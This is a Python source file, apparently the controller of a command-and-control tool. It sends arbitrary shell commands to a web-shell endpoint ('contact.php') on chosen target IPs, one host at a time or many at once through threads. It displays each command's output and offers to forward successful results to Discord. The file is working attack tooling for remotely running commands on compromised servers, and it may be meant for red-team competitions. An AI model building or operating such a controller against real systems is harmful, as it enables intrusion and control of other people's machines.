import InquirerPy.inquirer as inquirer
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from Server.styles import text_style
from Server.config_loader import CONFIG
from Server.discord import fwd_discord
from Server.display import choose_targets

console = Console()

def send_command(client, port, command, callback=False):
    contact_url = f"http://{client}:{port}/contact.php"
    
    # Send as JSON data
    data = {"input_word": command}

    try:
        # Using form data approach
        r = requests.post(contact_url, json=data, timeout=(3, CONFIG.other.TIMEOUT))
        clean_text = r.text.replace('<pre>', '').replace('</pre>', '')
        return (client, r.status_code, clean_text)

    except requests.exceptions.ConnectTimeout:
        return (client, "ERR", "Could not connect to the server (timed out)")
    except requests.exceptions.ReadTimeout:
        return (client, "ERR", "Server took to long to respond with command output")
    except Exception as e:
        return (client, "ERR", str(e))

def singular_execution():
    while True:
        target = inquirer.text(
            message="Enter target IP:",
            style=text_style
        ).execute()
        
        if not target:
            print("No target specified")
            return

        # Check if target is in ALL_HOSTS
        if target not in CONFIG.hosts.ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=False,
                style=text_style,
                transformer=lambda x: "y" if x else "n"
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    
    command = inquirer.text(
        message="Enter command to execute:",
        style=text_style
    ).execute()
    
    if not command:
        print("No command specified")
        return
    
    console.print(f"\n[bold #00ff00]Sending command to {target}...[/bold #00ff00]")
    console.print("=" * 60)
    
    # Show progress for single execution
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        transient=True,
    ) as progress:
        
        task = progress.add_task(f"[#00ff00]Executing on {target}...", total=1)
        result = send_command(target, CONFIG.other.PORT, command)
        progress.update(task, advance=1)
    
    target, status, response = result
    
    # Determine status color and icon
    if status == 200:
        status_color = "#00ff00"
        status_icon = "✅"
        status_text = "SUCCESS"
    elif isinstance(status, int) and 400 <= status < 600:
        status_color = "#ff0000"
        status_icon = "❌"
        status_text = f"ERROR {status}"
    else:
        status_color = "#ffff00"
        status_icon = "⚠️"
        status_text = f"FAILED: {status}"
    
    # Calculate dynamic line length based on terminal width
    terminal_width = console.size.width
    line_length = min(100, terminal_width - 4)
    double_line = "═" * line_length
    
    # Display results in a detailed box
    console.print(f"\n{double_line}")
    console.print("[bold #00ff00]SINGLE TARGET EXECUTION RESULTS[/bold #00ff00]")
    console.print(f"{double_line}")
    
    # Target header
    console.print(Panel(
        f"[bold {status_color}]🎯 TARGET: {target}[/bold {status_color}]",
        border_style=status_color,
        width=line_length,
        padding=(0, 1)
    ))
    
    # Status and command
    console.print(f"\n[bold white]Status:[/bold white] [{status_color}]{status_text}[/{status_color}]")
    
    # Response in a panel
    if response:
        console.print(f"\n[bold white]Full Response:[/bold white]")
        console.print(Panel(
            f"[#CCCCCC]{response}[/#CCCCCC]",
            border_style=status_color,
            width=line_length,
            padding=(1, 2)
        ))
    
    # Final separator
    console.print(f"\n{double_line}")
    console.print(f"{double_line}")

    if status_color == "#00ff00":
        print()
        log_successful_results = inquirer.confirm(
            message="Log successful result to Discord?",
            default=True,
            style=text_style
        ).execute()
        if log_successful_results:
            fwd_discord(target, response)

def mass_execution(command=None, callback=False, targets=None):
    from Server.thread import run_threads
    
    if targets == None:
        targets = choose_targets()
    if not targets:
        print("No targets selected")
        return

    if command == None:
        command = inquirer.text(
            message="Enter command to execute on all targets:",
            style=text_style
        ).execute()

    if not command:
        print("No command entered")
        return
    
    print(f"\nTargeting {len(targets)} hosts with command: {command}")
    confirm = inquirer.confirm(
        message="Proceed?", 
        default=True,
        style=text_style
    ).execute()
    if not confirm:
        return

    run_threads(targets, CONFIG.other.PORT, command, "command", callback=callback)